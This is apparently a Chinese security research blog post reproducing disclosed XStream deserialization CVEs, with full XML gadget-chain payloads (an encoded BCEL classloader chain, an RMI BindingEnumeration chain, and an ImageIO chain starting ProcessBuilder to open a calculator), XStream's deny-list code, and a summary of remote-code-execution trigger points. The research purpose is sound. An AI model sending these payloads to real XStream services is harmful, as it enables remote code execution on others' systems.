class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">java-class</span>&gt;</span>java.lang.Object<span class="tag">&lt;/<span class="name">java-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.lang.Runtime<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">java-class</span>&gt;</span>java.lang.Runtime<span class="tag">&lt;/<span class="name">java-class</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">classes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">ignored__packages</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">repository</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.org.apache.bcel.internal.util.SyntheticRepository&quot;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">__path</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">paths</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">class__path</span>&gt;</span><span class="tag">&lt;/<span class="name">class__path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">__path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">__loadedClasses</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">loader</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">nextName</span>&gt;</span>$$BCEL$$$l$8b$I$A$A$A$A$A$A$Au$90$cdJ$c3$40$U$85$cfm$ab$a91$d5$fe$d8V$c1E$5d$d9$K$fd3$a4$b5T$dc$I$ae$y$8a$V$5dO$c7$a1$a4$c6$q$a4S$f5$8d$5c$bbQq$e1$D$f8P$ea$8d$I$W$c4$Z8$c3$bd$dc$f3$9d$99y$ffx$7d$D$60c$83P$O$ef$fc$fa$ae$d3$ea$ed$f5$da$b6c$b7z$dd$8e$e3t$ba$b6$B$od$t$e2V4$3d$e1$8f$9b$t$a3$89$92$da$40$92$60$O$83Y$q$d5$91$eb$v$c2$e6$3f$feFl$r$y$ee$bb$be$ab$P$I$c9j$ed$c2$82$81$b4$89$U$96$I$a9$c3$e0$8a$ed$b9$df$84$b3$99$af$dd$he$c0$e2$88$b1$d2$3f5$a1X$ad$j$ff$Z$eb$5bX$c1$aa$89$M$b2$84R$Q$w$bfR$X$V$v$3c9$f3$84$O$a2$86$I$c34$f2$i$a4$ee$95$qlW$e7$YC$j$b9$fe$b8$3f$8f$3d$8d$C$a9$a6S$c6$ae$a1$YcK$84$ccP$Ly$3d$Q$e1$b9$Yy$K$5bH$f0$dd$e3E$bc$f9$v$ac$cb$5c$b5$b9$9b$e4$b3$b0$f3$M$f3$81$7fh$f0$82$5c$be$f0$84$f2$e5$e3$f7$f0$3a$ab$F$fad$P$Z$M$89$7b$L$ac$J$y$7e$B$e0$d2$95$ea$8b$B$A$A<span class="tag">&lt;/<span class="name">nextName</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">outer-class</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">serviceIterator</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">lock</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">cipher</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder$NullInputStream&quot;</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ibuffer</span>&gt;</span><span class="tag">&lt;/<span class="name">ibuffer</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">done</span>&gt;</span>false<span class="tag">&lt;/<span class="name">done</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ostart</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ostart</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ofinish</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ofinish</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">closed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">closed</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p>重点是Wh1t3p1g师傅BCEL的 classLoader的构造思路及过程，可看师傅原博。</p><h3 id="黑名单：-7"><a href="#黑名单：-7" class="headerlink" title="黑名单："></a>黑名单：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern BCEL_CL = Pattern.compile(<span class="string">&quot;.*\\.bcel\\..*\\.util\\.ClassLoader&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern LAZY_ITERATORS = Pattern.compile(<span class="string">&quot;.*\\$LazyIterator&quot;</span>);</span><br><span class="line">denyTypeHierarchy(InputStream.class);</span><br><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-29505"><a href="#CVE-2021-29505" class="headerlink" title="CVE-2021-29505"></a>CVE-2021-29505</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;map&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;string&gt;foo&lt;&#x2F;string&gt;</span><br><span class="line">    &lt;string&gt;foo&lt;&#x2F;string&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">  &lt;entry&gt;</span><br><span class="line">    &lt;com.sun.jndi.rmi.registry.BindingEnumeration&gt;</span><br><span class="line">      &lt;ctx&gt;</span><br><span class="line">        &lt;environment&#x2F;&gt;</span><br><span class="line">        &lt;registry class&#x3D;&quot;sun.rmi.registry.RegistryImpl_Stub&quot; serialization&#x3D;&quot;custom&quot;&gt;</span><br><span class="line">          &lt;java.rmi.server.RemoteObject&gt;</span><br><span class="line">            &lt;string&gt;UnicastRef&lt;&#x2F;string&gt;</span><br><span class="line">            &lt;string&gt;127.0.0.1&lt;&#x2F;string&gt;</span><br><span class="line">            &lt;int&gt;1099&lt;&#x2F;int&gt;</span><br><span class="line">            &lt;long&gt;0&lt;&#x2F;long&gt;</span><br><span class="line">            &lt;int&gt;0&lt;&#x2F;int&gt;</span><br><span class="line">            &lt;long&gt;0&lt;&#x2F;long&gt;</span><br><span class="line">            &lt;short&gt;0&lt;&#x2F;short&gt;</span><br><span class="line">            &lt;boolean&gt;false&lt;&#x2F;boolean&gt;</span><br><span class="line">          &lt;&#x2F;java.rmi.server.RemoteObject&gt;</span><br><span class="line">        &lt;&#x2F;registry&gt;</span><br><span class="line">        &lt;host&gt;127.0.0.1&lt;&#x2F;host&gt;</span><br><span class="line">        &lt;port&gt;1099&lt;&#x2F;port&gt;</span><br><span class="line">      &lt;&#x2F;ctx&gt;</span><br><span class="line">      &lt;names&gt;</span><br><span class="line">        &lt;string&gt;aa&lt;&#x2F;string&gt;</span><br><span class="line">      &lt;&#x2F;names&gt;</span><br><span class="line">      &lt;nextName&gt;0&lt;&#x2F;nextName&gt;</span><br><span class="line">    &lt;&#x2F;com.sun.jndi.rmi.registry.BindingEnumeration&gt;</span><br><span class="line">    &lt;com.sun.jndi.rmi.registry.BindingEnumeration reference&#x3D;&quot;..&#x2F;com.sun.jndi.rmi.registry.BindingEnumeration&quot;&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;entry&gt;</span><br><span class="line">&lt;&#x2F;map&gt;</span><br></pre></td></tr></table></figure><h2 id="XStream的防御措施"><a href="#XStream的防御措施" class="headerlink" title="XStream的防御措施"></a>XStream的防御措施</h2><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><p>在&gt;1.4.6之后的版本中，XStream引入了安全机制，以避免反序列化问题。</p><p>Wh1t3p1g师傅《回顾XStream反序列化漏洞》一文中0x03一节中解释得很好了，这里不赘述。贴一下参考【2】中提到的最新版1.4.16的黑名单。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ANNOTATION_MAPPER_TYPE = <span class="string">&quot;com.thoughtworks.xstream.mapper.AnnotationMapper&quot;</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern GETTER_SETTER_REFLECTION = Pattern.compile(<span class="string">&quot;.*\\$GetterSetterReflection&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern PRIVILEGED_GETTER = Pattern.compile(<span class="string">&quot;.*\\$PrivilegedGetter&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern LAZY_ITERATORS = Pattern.compile(<span class="string">&quot;.*\\$LazyIterator&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern JAXWS_ITERATORS = Pattern.compile(<span class="string">&quot;.*\\$ServiceNameIterator&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern JAVAFX_OBSERVABLE_LIST__ = Pattern.compile(<span class="string">&quot;javafx\\.collections\\.ObservableList\\$.*&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern JAVAX_CRYPTO = Pattern.compile(<span class="string">&quot;javax\\.crypto\\..*&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern BCEL_CL = Pattern.compile(<span class="string">&quot;.*\\.bcel\\..*\\.util\\.ClassLoader&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">setupSecurity</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.securityMapper != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">this</span>.addPermission(AnyTypePermission.ANY);</span><br><span class="line">        <span class="keyword">this</span>.denyTypes(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;java.beans.EventHandler&quot;</span>, <span class="string">&quot;java.lang.ProcessBuilder&quot;</span>, <span class="string">&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span>, <span class="string">&quot;jdk.nashorn.internal.objects.NativeString&quot;</span>, <span class="string">&quot;com.sun.corba.se.impl.activation.ServerTableEntry&quot;</span>, <span class="string">&quot;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&quot;</span>, <span class="string">&quot;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&quot;</span>, <span class="string">&quot;sun.swing.SwingLazyValue&quot;</span>&#125;);</span><br><span class="line">        <span class="keyword">this</span>.denyTypesByRegExp(<span class="keyword">new</span> Pattern[]&#123;LAZY_ITERATORS, GETTER_SETTER_REFLECTION, PRIVILEGED_GETTER, JAVAX_CRYPTO, JAXWS_ITERATORS, JAVAFX_OBSERVABLE_LIST__, BCEL_CL&#125;);</span><br><span class="line">        <span class="keyword">this</span>.denyTypeHierarchy(InputStream.class);</span><br><span class="line">        <span class="keyword">this</span>.denyTypeHierarchyDynamically(<span class="string">&quot;java.nio.channels.Channel&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.denyTypeHierarchyDynamically(<span class="string">&quot;javax.activation.DataSource&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.denyTypeHierarchyDynamically(<span class="string">&quot;javax.sql.rowset.BaseRowSet&quot;</span>);</span><br><span class="line">        <span class="keyword">this</span>.allowTypeHierarchy(Exception.class);</span><br><span class="line">        <span class="keyword">this</span>.securityInitialized = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自此，把基于jdk的现有已知链都block掉了。第三方的链（如Groovy）还在存活中，之后的发展趋势，不知道会不会类似fastjson/jackson之类的，开始漫长的block三方链。</p><h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><p>XStream在1.4.10版本增加了setupDefaultSecurity方式来设置默认的白名单，仅默认支持基础类的实例化。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本节复现了1.4.6之后的几个POC，主要是跟踪RCE漏洞触发点，至于链是如何构造的本节未做研究，这个作为下节的内容重点研究研究。</p><p>过程中遗留了1个现在解决不了的问题，CVE-2021-21347 8u60下的URLClassLoader构造存在问题，未解决，如果有大佬遇到并解决，求分享，不胜感激。</p><h4 id="总结下XStream的反序列化特点"><a href="#总结下XStream的反序列化特点" class="headerlink" title="总结下XStream的反序列化特点"></a>总结下XStream的反序列化特点</h4><ol><li><p>在Java原生反序列化中，可实例化的类必须是Serializable的，但是XStream不受限制所有类都可以实例化，这点和fastjson/jackson之类的一样。</p></li><li><p>fastjson/jackson实现类属性赋值，都是通过getsettr/setsettr来实现的（只是有些调用条件不同），XStream是通过Conveter的逻辑来实现（SerializableConveter也支持Java原生反序列化readObject）。</p><ul><li>为什么fastjson/jackson 存在jdk反序列化链没有XStream的多？因为并不是所有的类的属性都严格实现了get/set，导致很多jdk类不能完全还原。</li></ul></li><li><p>XStream的某些Conveter是存在问题的</p><ul><li>MapConverter/TreeSetConveter/TreeMapConveter都会触发这些集合/表 内元素的内部函数，比如compare、hashcode、equal这些函数。</li><li>DynamicProxyConverter 代理类，InvocationHandler可控，导致一些invoke存在RCE风险的InvocationHandler类，如EventHandler，可以加以利用。</li></ul></li></ol><h4 id="总结下RCE触发点"><a href="#总结下RCE触发点" class="headerlink" title="总结下RCE触发点"></a>总结下RCE触发点</h4><ol><li>invoke 实现上有问题的 InvokeHandler，如<ul><li>EventHandler</li><li>搭配MethodClosure的ConvertedClosure</li></ul></li><li>hashCode、compare、equal实现有问题的Map/Set/Queue，如<ul><li>Expando，hashCode搭配MethodClosure可以RCE</li><li>CVE-2021-21345 ServerTableEntry verify方法可RCE</li></ul></li><li>存在invoke，且method、obj可控的class（这一类普遍存在）<ul><li>CVE-2020-26217 ImageIO$ContainsFilter，filter方法内可控</li><li>CVE-2021-21344 Accessor$GetterSetterReflection，get方法可控</li><li>CVE-2021-21351 IncrementalSAXSource_Xerces parseSome方法内invoke可控</li></ul></li><li>利用ClassLoader实例化<ul><li>ServiceLoader$LazyIterator，调用点为Class.forName (name,initialize,loader) ，指定loader为BCEL classLoaer</li><li>CVE-2021-21347，调用点为loader.loadClass(name).newInstance()，利用java.net.URLClassLoader加载远程jar类并实例化</li><li>CVE-2021-21350，和LazyIterator一样，利用BCEL classLoader</li></ul></li></ol><h4 id="总结下Bullet-ysomap概念"><a href="#总结下Bullet-ysomap概念" class="headerlink" title="总结下Bullet(ysomap概念)"></a>总结下Bullet(ysomap概念)</h4><ol><li>ProcessBuilder.start() 无参数</li><li>Runtime.getRuntime().exec(cmd) 有参</li><li>JdbcRowSetImpl.connect()/prepare()/getDatabaseMetaData()/setAutoCommit(var1) 无参</li><li>MethodClosure.call() 无参</li></ol><p>有参的case比较少见，GroovyConvertedClosure是一例</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://www.anquanke.com/post/id/204314">回顾XStream反序列化漏洞</a></li><li>[2] <a href="https://paper.seebug.org/1543/">Xstream 反序列化远程代码执行漏洞深入分析</a></li><li>[3] <a href="https://x-stream.github.io/CVE-2020-26217.html">CVE-2020-26217</a></li><li>[4] <a href="https://x-stream.github.io/CVE-2021-21344.html">CVE-2021-21344</a></li><li>[5] <a href="https://x-stream.github.io/CVE-2021-21345.html">CVE-2021-21345</a></li><li>[6] <a href="https://x-stream.github.io/CVE-2021-21346.html">CVE-2021-21346</a></li><li>[7] <a href="https://x-stream.github.io/CVE-2021-21347.html">CVE-2021-21347</a></li><li>[8] <a href="https://x-stream.github.io/CVE-2021-21350.html">CVE-2021-21350</a></li><li>[9] <a href="https://x-stream.github.io/CVE-2021-21351.html">CVE-2021-21351</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;前文已经讲过XStream的反序列化特性及漏洞产生的原因，以及&amp;lt;=1.4.6版本的几个gadget，在此背景上，本节准备复现披露的几个RCE CVE，正向分析下。&lt;/p&gt;
&lt;p&gt;XStream团队很有意思，安全公告会把POC也公开，具体可以看&lt;a href=&quot;https://x-stream.github.io/security.html%E3%80%82&quot;&gt;https://x-stream.github.io/security.html。&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;CVE-2020-26217&quot;&gt;&lt;a href=&quot;#CVE-2020-26217&quot; class=&quot;headerlink&quot; title=&quot;CVE-2020-26217&quot;&gt;&lt;/a&gt;CVE-2020-26217&lt;/h2&gt;&lt;p&gt;这个其实就是Wh1t3p1g师傅中提到的第4个ImageIO gadget，在marshalsec gadgets ImageIO中也有，下面正向跟踪下。&lt;/p&gt;
&lt;h3 id=&quot;Wh1t3p1g师傅的POC&quot;&gt;&lt;a href=&quot;#Wh1t3p1g师傅的POC&quot; class=&quot;headerlink&quot; title=&quot;Wh1t3p1g师傅的POC&quot;&gt;&lt;/a&gt;Wh1t3p1g师傅的POC&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;map&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;lt;entry&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;lt;jdk.nashorn.internal.objects.NativeString&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;lt;flags&amp;gt;0&amp;lt;&amp;#x2F;flags&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      &amp;lt;value class&amp;#x3D;&amp;quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;lt;dataHandler&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;          &amp;lt;dataSource class&amp;#x3D;&amp;quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;lt;is class&amp;#x3D;&amp;quot;javax.crypto.CipherInputStream&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;              &amp;lt;cipher class&amp;#x3D;&amp;quot;javax.crypto.NullCipher&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;initialized&amp;gt;false&amp;lt;&amp;#x2F;initialized&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;opmode&amp;gt;0&amp;lt;&amp;#x2F;opmode&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;lt;serviceIterator class&amp;#x3D;&amp;quot;javax.imageio.spi.FilterIterator&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                  &amp;lt;iter class&amp;#x3D;&amp;quot;javax.imageio.spi.FilterIterator&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;iter class&amp;#x3D;&amp;quot;java.util.Collections$EmptyIterator&amp;quot;&amp;#x2F;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;lt;next class&amp;#x3D;&amp;quot;java.lang.ProcessBuilder&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;command class&amp;#x3D;&amp;quot;java.util.Arrays$ArrayList&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        &amp;lt;a class&amp;#x3D;&amp;quot;string-array&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                          &amp;lt;string&amp;gt;open&amp;lt;&amp;#x2F;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                          &amp;lt;string&amp;gt;-a&amp;lt;&amp;#x2F;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                          &amp;lt;string&amp;gt;calculator.app&amp;lt;&amp;#x2F;string&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        &amp;lt;&amp;#x2F;a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;&amp;#x2F;command&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                      &amp;lt;redirectErrorStream&amp;gt;false&amp;lt;&amp;#x2F;redirectErrorStream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    